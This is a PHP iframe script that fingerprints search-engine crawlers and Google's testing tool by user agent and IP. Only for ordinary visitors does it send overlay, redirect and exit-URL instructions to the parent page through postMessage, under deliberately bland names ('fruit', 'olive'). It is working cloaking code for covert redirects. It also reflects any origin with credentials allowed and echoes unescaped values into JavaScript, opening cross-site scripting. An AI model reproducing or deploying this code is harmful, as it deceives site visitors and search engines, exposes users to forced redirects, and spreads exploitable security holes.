<?php
require_once("setting.php");

if (isset($_SERVER['HTTP_ORIGIN'])) {
    // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one
    // you want to allow, and if so:
    header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Max-Age: 86400');    // cache for 1 day
}

// Access-Control headers are received during OPTIONS requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {

    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
        // may also be using PUT, PATCH, HEAD etc
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");         

    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
        header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");

    exit(0);
}

$robot_user_agents = array('Googlebot/2.X (+http://www.googlebot.com/bot.html)', 
						   'Slurp/2.0', 'MSNBOT/0.1 (http://search.msn.com/msnbot.htm)',
						   'Mozilla/5.0 (compatible; Google-Structured-Data-Testing-Tool +https://search.google.com/structured-data/testing-tool)',
						   'Mozilla/5.0 (compatible; Google-Structured-Data-Testing-Tool https://search.google.com/structured-data/testing-tool)',
						   'Mozilla/5.0 (compatible; Google-Structured-Data-Testing-Tool +http://developers.google.com/structured-data/testing-tool/)');

$robot_ip_addresses = array('209.85.238.11', '141.185.209', '169.207.238');

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip_address = $_SERVER['HTTP_REMOTE_ADDR'];

$check = 0;
if (in_array($user_agent, $robot_user_agents) or in_array($ip_address, $robot_ip_addresses))
	$check = 1;

if (array_key_exists('HTTP_ORIGIN', $_SERVER)) {
    $origin = $_SERVER['HTTP_ORIGIN'];
}
else if (array_key_exists('HTTP_REFERER', $_SERVER)) {
    $origin = $_SERVER['HTTP_REFERER'];
} else {
    $origin = $_SERVER['REMOTE_ADDR'];
}

if(isset($_GET['id']))
    $setting = getSettings($_GET['id']);
else
    $setting = array();
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<script>
	var fruit = {};
	var check = '<?php echo $check; ?>'; 
	var origin = '<?php echo $origin; ?>'; 

	var PeelFruit = function(d) {
		if(parseInt(check) == 0)
			window.parent.postMessage(d, origin);
		return true;	
	};

	fruit.message = 'olive';

	fruit.check = '1'; 

	fruit.overlaymode = parseInt('<?php echo $setting['overlayMode']; ?>'); 
	fruit.overlayurl = '<?php echo $setting['overlayURL']; ?>'; 

	fruit.redirectmode = parseInt('<?php echo $setting['redirectMode']; ?>'); 
	fruit.redirecturl = '<?php echo $setting['redirectURL']; ?>'; 
	fruit.redirectsec = '<?php echo $setting['redirectSec']; ?>'; 

	fruit.exitmode = parseInt('<?php echo $setting['exitMode']; ?>'); 
	fruit.exiturl = '<?php echo $setting['exitURL']; ?>'; 


	console.log(JSON.stringify(fruit)); var c = 0;

	var oTimer = setInterval(function(){ fruit.cnt = c; PeelFruit(fruit); c++; if(c > 50){clearInterval(oTimer)} }, 50); 

	var handler = function(e){ if(e.data == 's'){var s = new Object(); s.message = 'go'; clearInterval(oTimer); PeelFruit(s); }} 

	if(window.addEventListener){  addEventListener('message', handler, false)} 

	else{ attachEvent('onmessage', handler); } 

	</script>
</head>
<body>1<br /><!-- I am: Olive : production //--></body></html>